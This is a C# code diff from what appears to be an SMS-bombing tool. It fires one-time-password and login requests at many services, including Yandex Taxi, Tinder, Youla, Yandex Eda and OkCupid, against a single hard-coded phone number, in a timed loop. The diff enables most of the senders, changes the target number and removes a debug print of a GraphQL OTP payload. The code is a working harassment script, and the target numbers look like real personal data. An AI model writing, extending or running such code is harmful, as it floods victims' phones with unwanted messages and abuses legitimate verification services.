@@ -10,7 +10,7 @@ namespace test
     {
         public static void Main(string[] args)
         {
-            string phone = "9622042968"; //without country code
+            string phone = "9167380863"; //without country code
 
             YandexTaxi yandexTaxi = new YandexTaxi(phone);
             Tinder tinder = new Tinder(phone);
@@ -23,17 +23,17 @@ namespace test
             Wink wink = new Wink(phone);
             OkCupid okCupid = new OkCupid(phone);
 
-            for (int i = 0; i < 5; ++i)
+            for (int i = 0; i < 1; ++i)
             {
-                //yandexTaxi.SendYaTaxiPOST();
-                //tinder.SendTinderPOST();
-                //youla.SendYoulaPOST();
-                //karusel.SendKaruselPOST();
+                yandexTaxi.SendYaTaxiPOST();
+                tinder.SendTinderPOST();
+                youla.SendYoulaPOST();
+                karusel.SendKaruselPOST();
                 //findclone.SendFindclone();
-                //belkaCar.SendBelkaCarPOST();
-                //yandexEda.SenYaEdaPOST();
-                //salamPay.SendSalamPayPOST();
-                //wink.SendWinkPOST();
+                belkaCar.SendBelkaCarPOST();
+                yandexEda.SenYaEdaPOST();
+                salamPay.SendSalamPayPOST();
+                wink.SendWinkPOST();
                 okCupid.SendOkCupidPOST();
                 Thread.Sleep(7000);
             }
@@ -390,7 +390,6 @@ namespace test
             using (var streamWriter = new StreamWriter(request.GetRequestStream()))
             {
                 string json = "{\"operationName\":\"authOTPSend\",\"variables\":{\"input\":{\"tspAccessToken\":\"" + id + "\",\"phoneNumber\":\"" + phone + "\",\"platform\":\"web\"} },\"query\":\"mutation authOTPSend($input: AuthOTPSendInput!) {  authOTPSend(input: $input) {   success    __typename  }}\"}";
-                Console.WriteLine(json);
                 streamWriter.Write(json);
             }
 
